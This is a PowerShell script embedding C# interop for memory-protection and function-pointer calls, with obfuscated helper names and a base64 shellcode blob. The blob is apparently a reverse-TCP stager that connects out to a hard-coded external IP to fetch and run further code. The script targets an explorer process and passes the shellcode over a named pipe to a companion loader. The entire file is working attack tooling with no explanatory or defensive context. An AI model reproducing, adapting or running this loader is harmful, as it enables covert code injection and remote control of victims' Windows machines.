#Pipe1
$Win32 = @"
using System;
using System.Runtime.InteropServices;


public static class Main
    {

    public static Delegate GetDele(IntPtr ptr){
        return Marshal.GetDelegateForFunctionPointer(ptr, typeof(CRTStub));
    }

    [DllImport("msvcrt.dll")]
    public static extern IntPtr memset(IntPtr dest, uint src, uint count);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string nFunction);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate IntPtr CRTStub(IntPtr h, IntPtr a, IntPtr b, IntPtr c, IntPtr d, UInt32 e,UInt32 p,  out IntPtr f);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]    public delegate IntPtr VAStub(IntPtr a, UIntPtr b, UInt32 c, UInt32 d);

    public static Delegate thQFLBYd(IntPtr ptr){
            return Marshal.GetDelegateForFunctionPointer(ptr, typeof(VAStub));
    }

    [DllImport("msvcrt.dll")]
    public static extern IntPtr malloc(uint src);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary( [MarshalAs(UnmanagedType.LPStr)]string lpFileName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr b,UIntPtr s,uint p,out uint o);

    public static IntPtr PZJvAMbs(IntPtr hModule, string nFunction){
        return GetProcAddress(hModule, nFunction.Replace("_",""));
    }

}
"@

Add-Type -TypeDefinition $Win32
$startMain = [Main]

$PIT = ((Get-Process -Name "*explorer*" | Select-Object -Index 1).Id)
$enc = "/EiD5PDozAAAAEFRQVBSSDHSUWVIi1JgVkiLUhhIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACcPsr3r7EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V"
[Byte[]]$shellcode =[System.Convert]::FromBase64String($enc)
$SHLEN4 = $PIT * 4 + $shellcode.Length




#PIPING

$pipeName = "Pipe1"
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
$pipe.WaitForConnection()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($SHLEN4)
$pipe.Write($bytes, 0, $bytes.Length)
$pipe.Close()

$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
$pipe.WaitForConnection()
$enc = [System.Convert]::ToBase64String($shellcode)
$bytes = [System.Text.Encoding]::UTF8.GetBytes($enc)
$pipe.Write($bytes, 0, $bytes.Length)
$pipe.Close()

  




